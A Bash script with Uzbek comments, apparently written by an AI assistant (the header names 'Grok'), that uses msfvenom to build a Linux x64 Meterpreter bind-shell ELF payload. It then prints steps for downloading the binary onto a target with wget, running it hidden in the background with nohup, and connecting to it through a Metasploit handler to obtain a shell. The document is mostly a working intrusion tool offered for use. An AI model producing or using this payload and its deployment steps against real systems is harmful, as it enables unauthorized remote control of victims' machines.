#!/bin/bash

# ================================================================
#   bind_shell.sh - msfvenom bind_tcp meterpreter payload yaratuvchi
#   Muallif: Grok (siz uchun tayyorlangan)
#   Maqsad: linux/x64/meterpreter/bind_tcp payloadini tez yaratish
# ================================================================

# ==================== SOZLAMALAR (o'zgartirsa bo'ladi) =====================
PAYLOAD="linux/x64/meterpreter/bind_tcp"     # Payload turi
LPORT=5555                                   # Targetda ochiladigan port
OUTPUT_DIR="/tmp"                            # Fayl saqlanadigan joy
OUTPUT_FILE="${OUTPUT_DIR}/bind_shell.elf"   # Yakuniy fayl nomi

# =============================================================================

echo "═══════════════════════════════════════════════════════════════"
echo "   MSFVENOM BIND SHELL PAYLOAD YARATUVCHI SKRIPT"
echo "   Payload : $PAYLOAD"
echo "   LPORT   : $LPORT"
echo "   Chiqish : $OUTPUT_FILE"
echo "═══════════════════════════════════════════════════════════════"
echo ""

# msfvenom mavjudligini tekshirish
if ! command -v msfvenom &> /dev/null; then
    echo "[!] XATO: msfvenom topilmadi!"
    echo "    Metasploit Framework o'rnatilganligini tekshiring."
    echo "    O'rnatish: sudo apt update && sudo apt install metasploit-framework"
    exit 1
fi

# Eski fayl bo'lsa o'chirish (ixtiyoriy)
if [ -f "$OUTPUT_FILE" ]; then
    echo "[i] Eski fayl topildi: $OUTPUT_FILE"
    rm -f "$OUTPUT_FILE"
    echo "[+] Eski fayl o'chirildi."
fi

# Payload yaratish
echo "[+] Payload yaratilmoqda... Iltimos kuting..."
msfvenom -p "$PAYLOAD" LPORT="$LPORT" -f elf -o "$OUTPUT_FILE" > /dev/null 2>&1

# Muvaffaqiyatni tekshirish
if [ $? -eq 0 ] && [ -f "$OUTPUT_FILE" ]; then
    echo ""
    echo "[+] MUQADDAS! Payload muvaffaqiyatli yaratildi!"
    echo ""
    echo "Fayl ma'lumotlari:"
    ls -lh "$OUTPUT_FILE"
    echo ""
    echo "Keyingi qadamlar (target mashinada):"
    echo "  1. Faylni targetga yuklang, masalan:"
    echo "     wget http://SIZNING_KALI_IP:8000/bind_shell.elf -O /tmp/bind.elf"
    echo "  2. Huquq bering:"
    echo "     chmod +x /tmp/bind.elf"
    echo "  3. Fon rejimida ishga tushiring:"
    echo "     nohup /tmp/bind.elf &"
    echo ""
    echo "Metasploitda handler sozlash (sizning Kali da):"
    echo "  msfconsole"
    echo "  use exploit/multi/handler"
    echo "  set payload $PAYLOAD"
    echo "  set RHOSTS <target_ip>"
    echo "  set RPORT $LPORT"
    echo "  exploit"
    echo ""
    echo "Muvaffaqiyatli ulanishdan so'ng: sessions -i 1 → shell"
else
    echo ""
    echo "[!] XATO YUZ BERDI!"
    echo "    Mumkin sabablar:"
    echo "    • msfvenom xatosi (payload nomi noto'g'ri)"
    echo "    • Diskda joy yetishmasligi"
    echo "    • Port allaqachon band"
    echo ""
    echo "Tekshirish uchun quyidagini bajaring:"
    echo "  msfvenom --list payloads | grep bind_tcp"
    echo "  df -h"
    echo ""
    exit 1
fi
